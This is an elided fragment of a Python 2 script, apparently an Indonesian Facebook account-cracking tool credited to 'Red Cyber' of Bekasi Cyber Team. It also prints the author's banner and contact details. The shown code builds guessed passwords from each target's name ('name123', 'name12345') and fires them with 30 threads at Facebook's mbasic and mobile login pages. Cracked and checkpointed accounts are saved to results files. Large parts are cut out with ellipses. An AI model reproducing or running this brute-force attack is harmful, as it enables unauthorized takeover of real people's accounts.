...
logo = ''' \033[0;96m __  __        __  ______  ____
 \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ® \033[0m|| Created By Red Cyber
 \033[0;96m  \  / /___/ / /|_/ / _  / _/     \033[0m|| Github.com/Bekasi-Cyber-Team
 \033[0;96m  /_/       /_/  /_/____/_/ \033[0;91mv2.0  \033[0m|| https://www.instagram.com/p/CXNbQGklXyS-'''
...
def yayanxd():
    ...
    try:
        ...
        os.system('xdg-open https://youtube.com/channel/UCXvKseeNuwY9Uo-0WDDVH8A')
        moch_yayan()
    except KeyError:
...
'''
																																																				csy = 'Zarel sayang Lia'
																																																				ysc = 'Lia sayang Zarel'
																																																			'''
...
def info_tools():
    ...
    print '\n %s[%s>%s] Yt       : ./RelGans.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Author   : Zarel RedCyber.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Github   : https://github.com/BekasiCyberTeam'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Whatsapp : 088298445145.'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Instagram:https://www.instagram.com/p/CXNbQGklXyS_'%(N,H,N);time.sleep(0.07)
    print '\n %s[%s>%s] Website  : Setelah Update Script '%(N,H,N);time.sleep(0.07)
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
        ___Zarelganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
        if ___Zarelganteng___ in ('Y', 'y'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [*] method : ')
                        if cin == '':
                            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);__Rel__()()
                        elif cin == '1':
                            ...
                            with ZarelGanteng(max_workers=30) as (__RelGans__):
                                for ikeh in self.id:
                                    try:
                            ...
                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
                            with ZarelGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[1]
                                        __RelGans__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with LiaCantik(max_workers=30) as (__RelGans__):
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __RelGans__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __RelGans__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass
